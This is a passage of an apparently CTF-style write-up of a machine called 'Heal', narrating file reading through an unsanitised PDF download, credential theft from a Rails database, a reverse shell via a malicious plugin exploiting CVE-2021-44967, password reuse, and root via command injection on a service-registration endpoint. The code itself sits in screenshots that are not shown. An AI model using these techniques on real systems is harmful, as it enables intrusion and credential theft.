+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_2.png" alt="image.png" /></p>
+
+<p>We are being redirected to a new subdomain</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_3.png" alt="image.png" /></p>
+
+<p>This is a web application where you can put your data and build a resume</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_4.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_5.png" alt="image.png" /></p>
+
+<h1 id="2-user-flag">2. User flag</h1>
+
+<p>It is retrieving a pdf file</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_6.png" alt="image.png" /></p>
+
+<p>We can try to access the new file generated</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_7.png" alt="image.png" /></p>
+
+<p>Luckily there are no sanitization at all on it, we can access files where we have read permissions</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_8.png" alt="image.png" /></p>
+
+<p>Those are users that has allowed open a shell</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_9.png" alt="image.png" /></p>
+
+<p>On web application files, there are no more info, this part of the vulnerability testing was a fundamental part enumerating users.</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_10.png" alt="image.png" /></p>
+
+<p>Now it’s time to check the subdomain found previously, it is running rails, a framework to create database-backend applications, its version is disclosed</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_11.png" alt="image.png" /></p>
+
+<p>Reviewing some information about this framework we have some files that could contain privileged information</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_12.png" alt="image.png" /></p>
+
+<p>Effectively database file is readable</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_13.png" alt="image.png" /></p>
+
+<p>Ralph creds are found, but those didn’t work for ssh connection</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_14.png" alt="image.png" /></p>
+
+<p>Login as administrator</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_15.png" alt="image.png" /></p>
+
+<p>You will be redirected to a new subdomain</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_16.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_17.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_18.png" alt="image.png" /></p>
+
+<p>Login as administrator in the new subdomain</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_19.png" alt="image.png" /></p>
+
+<p>This application is used for perform surveys</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_20.png" alt="image.png" /></p>
+
+<p>Again its version is disclosed</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_21.png" alt="image.png" /></p>
+
+<p>CVE-2021-44967 was discover, and taking account that we have the hability to install plugins on it, we could try to exploit this cve</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_22.png" alt="image.png" /></p>
+
+<p>Set a .zip with config.xml which contains necessary tags to integrate as a plugin and a rev.php which will be execute it once we access the new plugin</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_23.png" alt="image.png" /></p>
+
+<p>Install</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_24.png" alt="image.png" /></p>
+
+<p>And activate</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_25.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_26.png" alt="image.png" /></p>
+
+<p>Access the file we want to execute</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_27.png" alt="image.png" /></p>
+
+<p>Now we have access as www-data</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_28.png" alt="image.png" /></p>
+
+<p>Check config files</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_29.png" alt="image.png" /></p>
+
+<p>Test if there are password reuse</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_30.png" alt="image.png" /></p>
+
+<p>Now we have access as ron</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_31.png" alt="image.png" /></p>
+
+<h1 id="3priv-esc">3.Priv esc</h1>
+
+<p>This part it’s pretty straightforward, check ports open in localhost</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_32.png" alt="image.png" /></p>
+
+<p>8500 seems to be something else</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_33.png" alt="image.png" /></p>
+
+<p>Here we have a service network solution</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_34.png" alt="image.png" /></p>
+
+<p>Once again it is disclosing the version</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_35.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_36.png" alt="image.png" /></p>
+
+<p>After a search we found improper handle of errors</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_37.png" alt="image.png" /></p>
+
+<p>We also have an exploit of remote code execution, which takes advantage of command injection vulnerability on the <code class="language-plaintext highlighter-rouge">/v1/agent/service/register</code> endpoint, using put request</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_38.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_39.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_40.png" alt="image.png" /></p>
+
+<p>That’s how we are going to gain access as root</p>
+
+<p><img src="/assets/images/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f/871a0ecf-dd92-4d1e-b6c8-f8c332e65a55-export-de0f8192-35f5-42ab-b7b8-5fd0884dea8f_image_41.png" alt="image.png" /></p>
+
+<p>Machine pwned!!!</p>]]></content><author><name>GitHub User</name></author><category term="writeups" /><summary type="html"><![CDATA[Heal]]></summary></entry></feed>
